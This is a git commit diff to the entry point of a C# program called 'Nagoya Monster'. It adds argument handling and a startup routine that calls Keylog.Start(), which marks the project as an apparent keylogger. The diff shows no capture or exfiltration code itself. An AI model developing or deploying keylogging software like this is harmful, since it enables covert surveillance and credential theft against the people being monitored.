c678e419217f664142866747ddd402eb52e2a28a
TiagoSeverino <TiagoSeverino@users.noreply.github.com>
2017-08-03 15:00:03 +0900

    Protect Release Versions From Running After Compiling

--- Nagoya Monster/Program.cs
+++ Nagoya Monster/Program.cs
@@ -1,15 +1,45 @@
-﻿namespace Nagoya_Monster
+﻿using System;
+
+namespace Nagoya_Monster
 {
     class Program
     {
-        public static bool isDebugging = true;
+        private const bool isRelease = false;
+        public static bool isDebugging;
         public static bool isRunning = true;  
 
         private static void Main(string[] args)
         {
+            ManageArgs(args);
+            Log.Add("Nagoya Monster Started");
+            StartDeamons();
+        }
+
+        private static void ManageArgs(string[] args)
+        {
+            if (args.Length > 0)
+            {
+                if (args[0] == "debug")
+                {
+                    if (isRelease)
+                    {
+                        #pragma warning disable CS0162 // Unreachable code detected
+                        Environment.Exit(0);
+                        #pragma warning restore CS0162 // Unreachable code detected
+                    }
+                    isDebugging = true;
+                }
+                else
+                {
+                    isDebugging = true;
+                }
+            }
+        }
+
+        private static void StartDeamons()
+        {
             Log.Add("Nagoya Monster Started");
             Keylog.Start();
-            Log.Add("Nagoya Monster Finished");
         }
     }
 }
